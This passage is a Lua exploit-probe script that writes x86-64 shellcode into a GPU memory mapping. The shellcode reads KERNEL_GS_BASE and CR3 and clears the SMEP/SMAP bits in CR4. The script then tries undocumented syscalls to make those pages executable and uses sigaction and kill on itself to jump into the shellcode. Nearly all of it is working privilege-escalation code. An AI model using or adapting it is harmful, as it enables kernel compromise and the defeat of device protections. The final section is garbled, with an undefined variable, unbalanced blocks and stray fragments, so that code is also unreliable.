    print("  GPU mmap at: " .. hexval(gpu))
else
    print("  GPU mmap FAILED: " .. tostring(val))
    print("  Cannot continue without writable memory")
    print("=== PROBE 55d ABORTED ===")
    return
end

-- ============================================================
-- Phase 2: Write shellcode into GPU region
-- ============================================================
print("")
print("[*] Phase 2: Writing shellcode into GPU mmap")

local sc_base = gpu  -- shellcode starts at beginning of GPU region
local result_buf = gpu + 0x1000  -- results stored 4KB later

-- Zero the result buffer
for i = 0, 0xFF, 4 do safe_wd(result_buf + i, 0) end

-- Shellcode 1: Simple test — write magic value and return
-- mov rax, 0x4141414141414141
-- mov [rdi], rax
-- ret
local sc1_bytes = {
    0x48, 0xB8, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,  -- mov rax, 0x4141...
    0x48, 0x89, 0x07,                                                -- mov [rdi], rax
    0xC3                                                              -- ret
}

-- Shellcode 2: Read KERNEL_GS_BASE via RDMSR
-- mov ecx, 0xC0000102   ; KERNEL_GS_BASE MSR
-- rdmsr
-- shl rdx, 32
-- or rax, rdx
-- mov [rdi], rax
-- ret
local sc2_bytes = {
    0xB9, 0x02, 0x01, 0x00, 0xC0,       -- mov ecx, 0xC0000102
    0x0F, 0x32,                           -- rdmsr
    0x48, 0xC1, 0xE2, 0x20,             -- shl rdx, 32
    0x48, 0x09, 0xD0,                    -- or rax, rdx
    0x48, 0x89, 0x07,                    -- mov [rdi], rax
    0xC3                                  -- ret
}

-- Shellcode 3: Read CR3 (page table base) — ring 0 only
-- mov rax, cr3
-- mov [rdi], rax
-- ret
local sc3_bytes = {
    0x0F, 0x20, 0xD8,   -- mov rax, cr3
    0x48, 0x89, 0x07,   -- mov [rdi], rax
    0xC3                 -- ret
}

-- Shellcode 4: Read CR4 and clear SMEP bit (bit 20) — ring 0 only
-- mov rax, cr4
-- mov [rdi], rax        ; save original CR4
-- btr rax, 20           ; clear SMEP
-- btr rax, 21           ; clear SMAP
-- mov cr4, rax
-- mov [rdi+8], rax      ; save new CR4
-- ret
local sc4_bytes = {
    0x0F, 0x20, 0xE0,           -- mov rax, cr4
    0x48, 0x89, 0x07,           -- mov [rdi], rax
    0x0F, 0xBA, 0xF0, 0x14,    -- btr rax, 20 (SMEP)
    0x0F, 0xBA, 0xF0, 0x15,    -- btr rax, 21 (SMAP)
    0x0F, 0x22, 0xE0,           -- mov cr4, rax
    0x48, 0x89, 0x47, 0x08,    -- mov [rdi+8], rax
    0xC3                         -- ret
}

-- Write all shellcodes at different offsets within the GPU page
local shellcodes = {
    {offset=0x000, bytes=sc1_bytes, name="magic_write"},
    {offset=0x040, bytes=sc2_bytes, name="read_gs_base"},
    {offset=0x080, bytes=sc3_bytes, name="read_cr3"},
    {offset=0x0C0, bytes=sc4_bytes, name="disable_smep"},
}

for _, sc in ipairs(shellcodes) do
    local addr = sc_base + sc.offset
    for i, b in ipairs(sc.bytes) do
        local byte_addr = addr + (i - 1)
        -- Write byte-by-byte using dword writes (aligned)
        local dword_addr = byte_addr - (byte_addr % 4)
        local existing = safe_rd(dword_addr) or 0
        local byte_offset = (byte_addr % 4) * 8
        local mask = 0xFF * (2 ^ byte_offset)
        existing = (existing & (~mask & 0xFFFFFFFF)) | (b * (2 ^ byte_offset))
        safe_wd(dword_addr, existing)
    end
    -- Verify first bytes
    local verify = safe_rd(addr)
    print(string.format("  %s at +0x%03X: first dword = 0x%08X", sc.name, sc.offset, verify or 0))
end

-- ============================================================
-- Phase 3: Attempt page attribute flip via sys 588
-- ============================================================
print("")
print("[*] Phase 3: Flip GPU pages to executable via sys 588")

local attr_struct = memory.alloc(0x40)

-- Try multiple protection value encodings
-- From 54d results, fill in whichever succeeded
local prot_attempts = {
    -- {struct_layout, description}
    {function()
        for i = 0, 0x1F, 4 do safe_wd(attr_struct + i, 0) end
        safe_wd(attr_struct, 0x07)  -- RWX at offset 0
    end, "prot=7 at +0"},
    {function()
        for i = 0, 0x1F, 4 do safe_wd(attr_struct + i, 0) end
        safe_wd(attr_struct, 0x05)  -- RX at offset 0
    end, "prot=5 at +0"},
    {function()
        for i = 0, 0x1F, 4 do safe_wd(attr_struct + i, 0) end
        safe_wd(attr_struct + 8, 0x07)  -- RWX at offset 8
    end, "prot=7 at +8"},
    {function()
        for i = 0, 0x1F, 4 do safe_wd(attr_struct + i, 0) end
        safe_wd(attr_struct, 0x37)  -- 0x33 | EXEC
    end, "prot=0x37 at +0"},
}

local flip_ok = false
for _, attempt in ipairs(prot_attempts) do
    attempt[1]()  -- set up struct

    local ok2, ret2 = pcall(function()
        return sc588(gpu, uint64(0x4000), uint64(attr_struct))
    end)
    if ok2 then
        local rv = signed32(ret2)
        print(string.format("  588(gpu, 0x4000, {%s}) = %d", attempt[2], rv))
        if rv == 0 then
            print("  >>> PAGE FLIP SUCCEEDED!")
            flip_ok = true
            break
        end
    else
        print(string.format("  588({%s}) CRASHED", attempt[2]))
    end
end

-- Also try sys 585 mtype_protect
if not flip_ok then
    print("")
    print("  Trying sys 585 mtype_protect as fallback...")
    -- mtype_protect(addr, len, prot)
    local prot_vals = {0x05, 0x07, 0x04}
    for _, pv in ipairs(prot_vals) do
        local ok2, ret2 = pcall(function()
            return sc585(gpu, uint64(0x4000), uint64(pv))
        end)
        if ok2 then
            local rv = signed32(ret2)
            print(string.format("  585(gpu, 0x4000, 0x%X) = %d", pv, rv))
            if rv == 0 then
                print("  >>> mtype_protect SUCCEEDED!")
                flip_ok = true
                break
            end
        end
    end
end

-- ============================================================
-- Phase 4: Jump primitives
-- ============================================================
print("")
print("[*] Phase 4: Finding a jump primitive")

-- Option A: signal handler + sigreturn with modified RIP
-- sigaction(SIGUSR1, handler=shellcode_addr, ...)
-- then raise(SIGUSR1)
print("  Option A: sigaction + raise")
local sc340 = make_syscall(340)  -- sigaction
local sc37  = make_syscall(37)   -- kill (to send signal to self)
local sc20  = make_syscall(20)   -- getpid

local pid = 0
do
    local ok2, ret2 = pcall(function() return sc20() end)
    if ok2 then pid = to_num(ret2) end
end

if flip_ok then
    -- Set up sigaction struct for SIGUSR1 (signal 30)
    local sa = memory.alloc(0x40)
    for i = 0, 0x3F, 4 do safe_wd(sa + i, 0) end
    -- sa_handler at +0 = shellcode address
    safe_wq(sa, sc_base)  -- point to our shellcode

    local ok2, ret2 = pcall(function()
        return sc340(uint64(30), uint64(sa), uint64(0))  -- SIGUSR1=30
    end)
    if ok2 then
        print("  sigaction(SIGUSR1, shellcode) = " .. signed32(ret2))
        if signed32(ret2) == 0 then
            print("  Sending SIGUSR1 to self (pid=" .. pid .. ")...")
            local ok3, ret3 = pcall(function()
                return sc37(uint64(pid), uint64(30))
            end)
            if ok3 then
                print("  kill() = " .. signed32(ret3))
                -- Check if shellcode wrote magic value

                    local h, l = get_hi_lo(magic)
                    if h == 0x41414141 and l == 0x41414141 then

                        print("  >>> Could be GS_BASE or CR3!")
                    end
                end

            end

    else

else
```
